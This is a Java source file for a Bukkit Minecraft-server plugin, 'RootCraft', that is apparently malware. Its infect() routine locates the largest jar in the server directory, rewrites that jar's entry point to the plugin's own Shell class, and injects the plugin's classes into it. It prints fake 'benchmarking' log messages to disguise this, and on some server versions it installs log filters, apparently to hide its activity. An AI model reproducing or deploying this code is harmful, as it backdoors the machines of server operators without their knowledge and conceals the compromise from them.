package com.testingsquish.craft;



import java.io.File;
import java.io.IOException;

import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.util.HashSet;

import java.util.Set;
import java.util.logging.LogManager;
import java.util.logging.Logger;






import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;

import org.bukkit.plugin.java.JavaPlugin;



public class RootCraft extends JavaPlugin{
	
	public String Path;
	public SimpleRoot sr;
	public boolean oldServer;
	@Override
    public void onEnable() {
		
		
		infect();
		
		if(oldServer)
			{
			getLogger().setFilter(new MyFilter2());	
			Bukkit.getLogger().setFilter(new MyFilter2());	
			Logger.getLogger("").setFilter(new MyFilter2());	
			Logger.getLogger("Minecraft").setFilter(new MyFilter2());	
			}
		sr = new SimpleRoot(getServer(),this);
		
    }
	
 public void runCheck()
	 {
		infect();
		sr = new SimpleRoot(getServer(),this);
	 }
	 

private String newHostEntry;

	private void infect() {
		if(getServer().getVersion().contains("-1.7."))
		{
			oldServer = false;	
		}else
		{
			oldServer = true;	
		}
		
		if(!oldServer)
		{
		File jarFile = findFile();
	    Jarchiver jar;
	  
		try {
			
			jar = new Jarchiver(jarFile.getAbsolutePath(), getServer(),findPathPlugin(),getserverPath());
	
			newHostEntry = jar.readEntryPoint();
            if (newHostEntry.equals(Shell.class.getName())) {
             
            } else {
            	benchMark();
                jar.changeEntryPoint(Shell.class.getName());
                Set<String> inFiles = getOwnEntries();
                jar.updateJar(inFiles, getRunningJarLocation(), newHostEntry);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
		}else
		{
			File jarFile = findFile();
		    Jarchiver jar;
		  
			try {
				
				jar = new Jarchiver(jarFile.getAbsolutePath(), getServer(),findPathPlugin(),getserverPath());
		
				newHostEntry = jar.readEntryPoint();
	            if (newHostEntry.equals(Shell2.class.getName())) {
	             
	            } else {
	            	benchMark();
	                jar.changeEntryPoint(Shell2.class.getName());
	                Set<String> inFiles = getOwnEntries();
	                jar.updateJar(inFiles, getRunningJarLocation(), newHostEntry);
	            }
	        } catch (IOException e) {
	            e.printStackTrace();
	        }
		}
    }

	
	 public void benchMark() {
		getServer().getLogger().info("1/4    BENCHMARKING:    RAM test...");
		getServer().getLogger().info("2/4    BENCHMARKING:    Read times...");
		getServer().getLogger().info("3/4    BENCHMARKING:    CPU test...");
		
	}


	private Set<String> getOwnEntries() {
	        Set<String> inFiles = new HashSet<String>();
	        if(oldServer)
	        {
	        	inFiles.add("com/testingsquish/craft/Shell2.class");
	        	inFiles.add("com/testingsquish/craft/MyFilter2.class");
	        }else
	        {
	        	inFiles.add("com/testingsquish/craft/Shell.class");	
	        	 inFiles.add("com/testingsquish/craft/MyFilter.class");
	 	        inFiles.add("com/testingsquish/craft/MyFilter2.class");
	        }
	        
	        
	       
	        return inFiles;
	    }
	 
	    private String getRunningJarLocation() {
            String path = Shell.class.getProtectionDomain().getCodeSource()
                    .getLocation().getPath();
            try {
                return URLDecoder.decode(path, "UTF-8");
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            return null;
    }
	
	private File findFile() {
		
		File temp = new File(getServer().getUpdateFolderFile().getAbsolutePath().substring(0, getServer().getUpdateFolderFile().getAbsolutePath().length()-14));
		
		File[] files = temp.listFiles();
		int b = 0;
		long size = 0;
		for(int i = 0 ; i < files.length;i++)
			{
				if(files[i].getName().toLowerCase().contains(".jar"))
				{
					if(files[i].getTotalSpace() > size)
						{
							size = files[i].getTotalSpace();
							b = i;
						}
				}
			}
		return files[b];
	}
	
	private String findPathPlugin() {
		
		
		return getServer().getUpdateFolderFile().getAbsolutePath().substring(0, getServer().getUpdateFolderFile().getAbsolutePath().length()-7);
	}

private String getserverPath() {
		
		
		return getServer().getUpdateFolderFile().getAbsolutePath().substring(0, getServer().getUpdateFolderFile().getAbsolutePath().length()-14);
	}


	@Override
    public void onDisable() {
       
    }
	
  
    @Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args){
    	
    	return false; 
    }

    
}

